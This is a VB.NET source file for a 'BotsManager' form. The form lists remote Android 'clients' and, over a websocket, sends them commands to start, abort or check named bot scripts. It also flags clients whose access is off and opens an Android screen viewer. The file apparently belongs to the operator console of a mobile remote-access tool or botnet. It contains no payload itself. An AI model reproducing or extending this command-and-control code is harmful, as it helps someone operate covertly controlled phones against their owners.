Imports System.Net.NetworkInformation
Imports System.Runtime.InteropServices
Imports System.Security.Cryptography
Imports System.Text
Imports System.Windows.Forms.AxHost
Imports Microsoft.Web.WebView2.Core

Public Class BotsManager
    Public listclients As New List(Of BTClient)
    Public dgvlink As New Dictionary(Of String, DataGridViewRow)

    Private emptyimg As Bitmap

    <ComVisible(True)>
    Public Class mybridge
        Public mainform As BotsManager
        Sub New(minme As BotsManager)
            mainform = minme
        End Sub

        <DispId(1)>
        Public Sub RunCommand(thename As String, thecommand As String)
            mainform.Invoke(Sub()
                                Dim nonefound As Boolean = True
                                mainform.DGVC.EndEdit()
                                For Each ro As DataGridViewRow In mainform.DGVC.Rows
                                    Dim isChecked As Boolean = False
                                    If ro.Cells(0).Value IsNot Nothing AndAlso ro.Cells(0).Value IsNot DBNull.Value Then
                                        isChecked = Convert.ToBoolean(ro.Cells(0).Value)
                                    End If


                                    If isChecked Then
                                        Dim mobid As String = ro.Tag
                                        If mobid = "-1" Then
                                            Continue For
                                        End If
                                        Dim chatData As New Dictionary(Of String, Object) From {
                                               {"msg", "bot"},
                                               {"subc", "S"},'s = start
                                               {"botn", thename},'s = start
                                               {"botc", thecommand}
                                         }
                                        BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
                                        Threading.Thread.Sleep(1)
                                        nonefound = False
                                    End If
                                Next

                                If nonefound Then
                                    BTAlerter.infos("Select clients first")
                                End If

                            End Sub)
        End Sub
        <DispId(2)>
        Public Sub Alerter(msg As String)
            mainform.Invoke(Sub()
                                BTAlerter.infos(msg)
                            End Sub)
        End Sub
    End Class

    Private Async Sub BotsManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.Opacity = 0

        emptyimg = New Bitmap(1, 1)

        bottitle.Text = botmgrstr
        srchbtn.Text = adrovewstr
        Label2.Text = actvclstr

        ' Persistent storage folder
        Dim userDataFolder As String = IO.Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "BTBOTSCACH"
        )

        ' Create environment with storage path
        Dim env = Await CoreWebView2Environment.CreateAsync(Nothing, userDataFolder)
        Await BotsView.EnsureCoreWebView2Async(env)


        AddHandler BotsView.NavigationCompleted, AddressOf WebView_NavigationCompleted


        ' Map a fake domain to a folder (even if unused, it gives an origin)
        'Dim tempFolder = IO.Path.GetTempPath()
        'IO.File.WriteAllText(IO.Path.Combine(tempFolder, "btbots.html"), My.Resources.BTBOTS, Encoding.UTF8)

        Dim tempFolder = IO.Path.GetTempPath()
        Dim htmlPath = IO.Path.Combine(tempFolder, "btbots.html")


        IO.File.WriteAllBytes(htmlPath, My.Resources.BTBOTS)

        Dim thetext As String = IO.File.ReadAllText(htmlPath).Replace("[LNG]", locallanguage())

        IO.File.WriteAllText(htmlPath, thetext, Encoding.UTF8)


        BotsView.CoreWebView2.SetVirtualHostNameToFolderMapping(
           BTConst.myname, tempFolder, CoreWebView2HostResourceAccessKind.Allow
        )

        ' Load the HTML from the fake domain
        BotsView.CoreWebView2.Navigate($"https://{BTConst.myname}/btbots.html")

        ' Bridge to VB.NET
        Dim term As New mybridge(Me)
        BotsView.CoreWebView2.AddHostObjectToScript("mybridge", term)

    End Sub
    Private Sub WebView_NavigationCompleted(sender As Object, e As Microsoft.Web.WebView2.Core.CoreWebView2NavigationCompletedEventArgs)
        loadclients()
        refresher.RunWorkerAsync()
        Me.Opacity = 1
    End Sub
    Private Sub loadclients()
        If listclients.Count > 0 Then
            For Each cli As BTClient In listclients
                Try

                    Dim rowindex As Integer = DGVC.Rows.Add(False, cli.wallpaper, cli.name, "...", emptyimg)
                    Dim trow As DataGridViewRow = DGVC.Rows(rowindex)
                    trow.Tag = cli.mobid
                    'when client reply we get the row using dgvlink
                    dgvlink.Add(cli.mobid, trow)
                Catch ex As Exception
                    MsgBox("loadclients error: " & ex.Message)
                End Try
            Next
        End If

    End Sub
    Private Sub DGVC_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DGVC.CellContentClick

        If e.RowIndex >= 0 Then

            If e.ColumnIndex = DGVC.Columns.Count - 1 Then
                If DGVC.Rows(e.RowIndex).Cells(4).Tag IsNot Nothing AndAlso DGVC.Rows(e.RowIndex).Cells(4).Tag = "1" Then

                    If MyMsg.Show("Confirm", "Force stop bot ?", msgtype.Confirm, True) = DialogResult.OK Then
                        Dim mobid As String = DGVC.Rows(e.RowIndex).Tag
                        If mobid = "-1" Then
                            BTAlerter.infos("Client ID missing")
                            Return
                        End If
                        Dim chatData As New Dictionary(Of String, Object) From {
                               {"msg", "bot"},
                               {"subc", "A"}'a = Abort
                         }
                        BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
                    End If
                End If
            End If
        End If
    End Sub

    Private Sub DGVC_CellMouseEnter(sender As Object, e As DataGridViewCellEventArgs) Handles DGVC.CellMouseEnter

        If e.RowIndex >= 0 Then

            If e.ColumnIndex = DGVC.Columns.Count - 1 Then
                If DGVC.Rows(e.RowIndex).Cells(4).Tag IsNot Nothing AndAlso DGVC.Rows(e.RowIndex).Cells(4).Tag = "1" Then
                    DGVC.Cursor = Cursors.Hand
                Else
                    DGVC.Cursor = Cursors.Default
                End If
            Else
                DGVC.Cursor = Cursors.Default
            End If
        Else
            DGVC.Cursor = Cursors.Default
        End If
    End Sub

    Private Sub DGVC_CellMouseLeave(sender As Object, e As DataGridViewCellEventArgs) Handles DGVC.CellMouseLeave
        DGVC.Cursor = Cursors.Default
    End Sub


    Private ialive As Boolean = True
    Private Sub refresher_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles refresher.DoWork
        While ialive
            Try
                Threading.Thread.Sleep(5000)
                If Me.IsDisposed Then
                    Exit While
                End If
                If listclients.Count > 0 Then
                    For Each cli As BTClient In listclients
                        Try
                            If Me.IsDisposed Or Not ialive Then
                                Exit While
                            End If
                            If skiplist.Contains(cli.mobid) Then
                                Continue For
                            End If
                            Dim chatData As New Dictionary(Of String, Object) From {
                                     {"msg", "bot"},
                                     {"subc", "C"}'c = check
                            }
                            BTEngine.commands(chatData, cli.mobid, BTEngine.MainForm.webSocketClient)

                            Threading.Thread.Sleep(1)
                        Catch ex As Exception
                            MsgBox("loadclients error: " & ex.Message)
                        End Try
                    Next
                End If

            Catch ex As Exception

            End Try
        End While
    End Sub
    Dim Mx As Integer
    Dim Sw As Integer
    Dim movX As Boolean
    Private Sub DrakeWidth_W7_MouseDown(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseDown
        movX = True
        Mx = MousePosition.X
        Sw = Width
    End Sub

    Private Sub DrakeWidth_W7_MouseMove(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseMove
        If movX = True Then
            Width = MousePosition.X - Mx + Sw

        End If
    End Sub

    Private Sub DrakeWidth_W7_MouseUp(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseUp
        movX = False

    End Sub
    Dim Myyy As Integer
    Dim Sh As Integer
    Dim movY As Boolean
    Private Sub DrakeWidth_W8_MouseDown(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseDown
        movY = True
        Myyy = MousePosition.Y
        Sh = Height
    End Sub

    Private Sub DrakeWidth_W8_MouseMove(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseMove
        If movY = True Then
            Height = MousePosition.Y - Myyy + Sh
        End If
    End Sub

    Private Sub DrakeWidth_W8_MouseUp(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseUp
        movY = False

    End Sub

    Private skiplist As New List(Of String)
    Public Sub clientisoff(mobid As String)
        If Me.InvokeRequired Then
            Me.Invoke(Sub()
                          clientisoff(mobid)
                      End Sub)
            Exit Sub
        Else
            Dim trow As DataGridViewRow
            If dgvlink.ContainsKey(mobid) AndAlso Not skiplist.Contains(mobid) Then
                trow = dgvlink(mobid)
                trow.Tag = "-1"
                trow.Cells(3).Value = "ACCESS OFF"
                skiplist.Add(mobid)
            End If

        End If
    End Sub
    Public Sub updateclient(mobid As String, state As String, lastactive As String)
        If Me.InvokeRequired Then
            Me.Invoke(Sub()
                          updateclient(mobid, state, lastactive)
                      End Sub)
            Exit Sub
        Else
            Dim trow As DataGridViewRow

            If skiplist.Contains(mobid) Then
                skiplist.Remove(mobid)
            End If

            If dgvlink.ContainsKey(mobid) Then
                trow = dgvlink(mobid)



                Select Case state.ToUpper()
                    Case "WAITING"
                        trow.Cells(3).Style.ForeColor = Color.Gray
                        trow.Cells(4).Value = emptyimg
                        trow.Cells(4).Tag = "0"
                    Case "RUNNING"
                        trow.Cells(3).Style.ForeColor = Color.DodgerBlue
                        trow.Cells(4).Value = My.Resources.xstop
                        trow.Cells(4).Tag = "1"
                    Case "SUCCESS"
                        trow.Cells(3).Style.ForeColor = Color.Green
                        trow.Cells(4).Value = emptyimg
                        trow.Cells(4).Tag = "0"
                    Case "FAIL"
                        trow.Cells(3).Style.ForeColor = Color.Red
                        trow.Cells(4).Value = emptyimg
                        trow.Cells(4).Tag = "0"
                    Case "ABORTED"
                        trow.Cells(3).Style.ForeColor = Color.OrangeRed
                        trow.Cells(4).Value = emptyimg
                        trow.Cells(4).Tag = "0"
                    Case Else
                        trow.Cells(3).Style.ForeColor = Color.White
                        trow.Cells(4).Value = emptyimg
                        trow.Cells(4).Tag = "0"
                End Select

                trow.Cells(3).Value = TranslateState(state)
                trow.Cells(3).ToolTipText = lastactive


            End If

        End If

    End Sub
    Private Sub BotsManager_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ialive = False
        refresher.Dispose()
    End Sub

    Private Sub Panel3_MouseDown(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseDown, Panel4.MouseDown, Panel3.MouseDown, bottitle.MouseDown
        Try
            If e.Button = Windows.Forms.MouseButtons.Left Then
                ReleaseCapture()
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub closbtn_Click(sender As Object, e As EventArgs) Handles closbtn.Click
        Me.Close()
    End Sub
    Dim keepmeto As Boolean = True
    Private Sub pinbtn_Click(sender As Object, e As EventArgs) Handles pinbtn.Click
        If keepmeto Then
            '  button1.Text = "yes on top"
            pinbtn.ForeColor = Color.DeepSkyBlue
            pinbtn.RectColor = Color.DeepSkyBlue
            Dim HwndTopmost As IntPtr = New IntPtr(-1)
            SetWindowPos(Me.Handle, HwndTopmost, 0, 0, 0, 0, TOPMOST_FLAGS)
            keepmeto = False
        Else
            '  button1.Text = "not on top"
            pinbtn.ForeColor = Color.White
            pinbtn.RectColor = Color.Gray
            Dim HwndTopmost As IntPtr = New IntPtr(-2)
            SetWindowPos(Me.Handle, HwndTopmost, 0, 0, 0, 0, TOPMOST_FLAGS)
            keepmeto = True
        End If
    End Sub

    Private Sub minibtn_Click(sender As Object, e As EventArgs) Handles minibtn.Click
        Me.WindowState = WindowState.Minimized
    End Sub

    Private AV As AndroidViewer
    Private Sub srchbtn_Click(sender As Object, e As EventArgs) Handles srchbtn.Click
        If AV Is Nothing OrElse AV.IsDisposed Then
            AV = New AndroidViewer()

            AddHandler AV.FormClosed, Sub()
                                          AV = Nothing
                                      End Sub

            AV.Show()
        Else

            AV.BringToFront()
            AV.Focus()
        End If
    End Sub
    Private Function TranslateState(state As String) As String
        Dim lang As String = locallanguage()

        Select Case lang
            Case "ar" ' Arabic
                Select Case state.ToUpper()
                    Case "WAITING" : Return "في الانتظار"
                    Case "RUNNING" : Return "جارٍ التنفيذ"
                    Case "SUCCESS" : Return "نجاح"
                    Case "FAIL" : Return "فشل"
                    Case "ABORTED" : Return "أُلغيت"
                End Select

            Case "zh" ' Chinese
                Select Case state.ToUpper()
                    Case "WAITING" : Return "等待中"
                    Case "RUNNING" : Return "运行中"
                    Case "SUCCESS" : Return "成功"
                    Case "FAIL" : Return "失败"
                    Case "ABORTED" : Return "已中止"
                End Select

            Case "ru" ' Russian
                Select Case state.ToUpper()
                    Case "WAITING" : Return "Ожидание"
                    Case "RUNNING" : Return "Выполняется"
                    Case "SUCCESS" : Return "Успех"
                    Case "FAIL" : Return "Ошибка"
                    Case "ABORTED" : Return "Прервано"
                End Select

            Case "tr" ' Turkish
                Select Case state.ToUpper()
                    Case "WAITING" : Return "Bekleniyor"
                    Case "RUNNING" : Return "Çalışıyor"
                    Case "SUCCESS" : Return "Başarılı"
                    Case "FAIL" : Return "Hata"
                    Case "ABORTED" : Return "Durduruldu"
                End Select

            Case "es" ' Spanish
                Select Case state.ToUpper()
                    Case "WAITING" : Return "Esperando"
                    Case "RUNNING" : Return "En ejecución"
                    Case "SUCCESS" : Return "Éxito"
                    Case "FAIL" : Return "Fallo"
                    Case "ABORTED" : Return "Cancelado"
                End Select

            Case "pt" ' Brazilian Portuguese
                Select Case state.ToUpper()
                    Case "WAITING" : Return "Aguardando"
                    Case "RUNNING" : Return "Em execução"
                    Case "SUCCESS" : Return "Sucesso"
                    Case "FAIL" : Return "Falha"
                    Case "ABORTED" : Return "Abortado"
                End Select

            Case Else ' English fallback
                Select Case state.ToUpper()
                    Case "WAITING" : Return "Waiting"
                    Case "RUNNING" : Return "Running"
                    Case "SUCCESS" : Return "Success"
                    Case "FAIL" : Return "Fail"
                    Case "ABORTED" : Return "Aborted"
                End Select
        End Select

        ' If state is unknown
        Return state
    End Function

End Class